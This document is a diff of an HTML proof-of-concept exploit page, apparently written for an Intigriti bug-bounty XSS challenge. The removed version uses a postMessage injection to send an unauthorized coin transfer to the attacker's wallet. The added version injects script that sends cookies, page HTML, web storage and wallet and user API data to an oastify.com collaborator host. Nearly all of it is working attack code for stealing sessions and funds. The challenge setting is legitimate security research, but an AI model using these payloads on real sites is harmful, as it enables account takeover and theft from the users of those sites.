@@ -1,66 +1,124 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Intigriti Challenge</title>
+    <title>XSS PoC - Intigriti Challenge</title>
 </head>
 <body>
-    <h1>Exploit Sent...</h1>
-    <iframe id="target" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="width:0;height:0;border:0;"></iframe>
+<script>
+// When the admin bot visits this page:
+// 1. Fetch vulnerable API endpoint with XSS payload
+// 2. Inject response into iframe to execute XSS
+// 3. XSS in bot's context steals flag and sends to collaborator
 
-    <script>
-        const BASE_URL = 'https://challenge-0126.intigriti.io';
-        // Your specific wallet address from the logs
-        const MY_WALLET = '13303a656bdddcb618e9c24da160327453'; 
+const collaborator = 'tkhc89fc2l3thl98ptwzq8tu6lcc06ov.oastify.com';
+const xssPayload = `
+<script>
+    // Steal cookies
+    fetch('http://${collaborator}/cookies?data=' + encodeURIComponent(document.cookie));
+    
+    // Steal entire document HTML (might contain flag)
+    fetch('http://${collaborator}/html?data=' + encodeURIComponent(document.documentElement.outerHTML));
+    
+    // Check for flag in page text
+    const bodyText = document.body.innerText;
+    if(bodyText.includes('INTIGRITI{')) {
+        const flagMatch = bodyText.match(/INTIGRITI{.*?}/);
+        if(flagMatch) {
+            fetch('http://${collaborator}/flag?data=' + encodeURIComponent(flagMatch[0]));
+        }
+    }
+    
+    // Check localStorage
+    for(let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        const value = localStorage.getItem(key);
+        fetch('http://${collaborator}/localstorage?key=' + encodeURIComponent(key) + '&value=' + encodeURIComponent(value));
+    }
+    
+    // Check sessionStorage
+    for(let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        const value = sessionStorage.getItem(key);
+        fetch('http://${collaborator}/sessionstorage?key=' + encodeURIComponent(key) + '&value=' + encodeURIComponent(value));
+    }
+    
+    // Try to access dashboard data via APIs
+    fetch('/api/wallets', {credentials: 'include'})
+        .then(r => r.text())
+        .then(data => fetch('http://${collaborator}/wallets?data=' + encodeURIComponent(data)));
+    
+    fetch('/api/user', {credentials: 'include'})
+        .then(r => r.text())
+        .then(data => fetch('http://${collaborator}/user?data=' + encodeURIComponent(data)));
+<\/script>`;
 
-        const frame = document.getElementById('target');
-        
-        frame.onload = function() {
-            if (this.src.includes('marketwatch')) return;
-
+// Execute when page loads
+window.onload = function() {
+    console.log('Starting XSS exploit...');
+    
+    // Use the API endpoint that gave us XSS (based on your tests)
+    // Try multiple endpoints to increase chances
+    const endpoints = [
+        `/api/wallets?filter=${encodeURIComponent(xssPayload)}`,
+        `/api/marketwatch?currency=${encodeURIComponent(xssPayload)}`,
+        `/api/search?q=${encodeURIComponent(xssPayload)}`
+    ];
+    
+    // Try each endpoint
+    endpoints.forEach(endpoint => {
+        fetch(endpoint, {
+            credentials: 'include',
+            mode: 'no-cors'  // Helps bypass some restrictions
+        })
+        .then(response => response.text())
+        .then(htmlResponse => {
+            console.log('Got response from', endpoint);
+            
+            // Inject into iframe to execute scripts
+            const iframe = document.createElement('iframe');
+            iframe.srcdoc = htmlResponse;
+            iframe.style.width = '0';
+            iframe.style.height = '0';
+            iframe.style.border = 'none';
+            document.body.appendChild(iframe);
+            
+            // Also try other injection methods
             setTimeout(() => {
-                // --- THE FIXED PAYLOAD ---
-                // We use single quotes for the HTML attribute (onerror='...')
-                // We use double quotes inside the JS (method: "POST")
-                
-                const jsCode = `
-                    fetch('/api/transaction', {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        credentials: "include",
-                        body: JSON.stringify({
-                            toAddress: "${MY_WALLET}",
-                            currency: "1337COIN",
-                            amount: 1337
-                        })
-                    })
-                `;
-
-                // Remove newlines
-                const flatCode = jsCode.replace(/\n/g, ' ');
-
-                // ⚠️ CRITICAL FIX: Note the single quotes around the onerror value
-                const xss = `"><img src=x onerror='${flatCode}'>`;
-
-                // Send the malicious transaction
-                frame.contentWindow.postMessage({
+                const div = document.createElement('div');
+                div.innerHTML = htmlResponse;
+                document.body.appendChild(div);
+            }, 100);
+        })
+        .catch(error => {
+            console.error('Error with', endpoint, error);
+        });
+    });
+    
+    // Also try the postMessage vulnerability as backup
+    setTimeout(() => {
+        const checkoutIframe = document.createElement('iframe');
+        checkoutIframe.src = '/checkout.html?currency=BTC&price=1';
+        checkoutIframe.style.width = '0';
+        checkoutIframe.style.height = '0';
+        document.body.appendChild(checkoutIframe);
+        
+        setTimeout(() => {
+            try {
+                checkoutIframe.contentWindow.postMessage({
                     type: 'submitTransaction',
                     transaction: {
-                        currency: '1337COIN', 
-                        amount: 1337, 
-                        toAddress: xss
+                        currency: '1337COIN',
+                        amount: 0.001,
+                        toAddress: '"><img src=x onerror="fetch(\\'http://${collaborator}/postmessage?data=\\'+encodeURIComponent(document.cookie))">'
                     }
                 }, '*');
-
-                // Redirect to trigger execution
-                setTimeout(() => {
-                    frame.src = BASE_URL + '/marketwatch.html';
-                }, 1500);
-
-            }, 2000);
-        };
-    </script>
+                console.log('postMessage sent to checkout');
+            } catch(e) {
+                console.error('postMessage failed:', e);
+            }
+        }, 2000);
+    }, 1000);
+};
+</script>
 </body>
 </html>
